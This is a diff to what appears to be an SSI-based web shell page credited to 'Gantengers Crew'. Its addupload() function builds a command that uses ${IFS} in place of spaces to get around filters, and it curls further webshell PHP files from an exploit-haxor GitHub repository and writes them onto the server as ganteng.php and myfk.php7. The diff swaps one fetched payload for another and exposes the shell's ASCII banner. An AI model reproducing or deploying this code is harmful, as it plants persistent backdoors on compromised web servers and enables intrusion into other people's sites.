@@ -59,7 +59,7 @@ function nezcmd()
 
 function addupload()
 {
-	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/wp.zip${IFS}|${IFS}tee${IFS}-a${IFS}admin.zip;curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/master/myfk3.php${IFS}|${IFS}tee${IFS}-a${IFS}ganteng.php";
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/myfk.php${IFS}|${IFS}tee${IFS}-a${IFS}myfk.php7;curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/master/myfk3.php${IFS}|${IFS}tee${IFS}-a${IFS}ganteng.php";
 }
 </script>
 <style type="text/css">
@@ -211,7 +211,7 @@ Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl -->
             <pre id="shell-content">
                 <div id="shell-logo">
 <pre>
-<!--                   
+                 
        
 
                     ,                                                 
@@ -249,7 +249,6 @@ Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl -->
 
 Author:Gantengers Crew
 
--->
 <span></span>
                 </div>
             </pre>
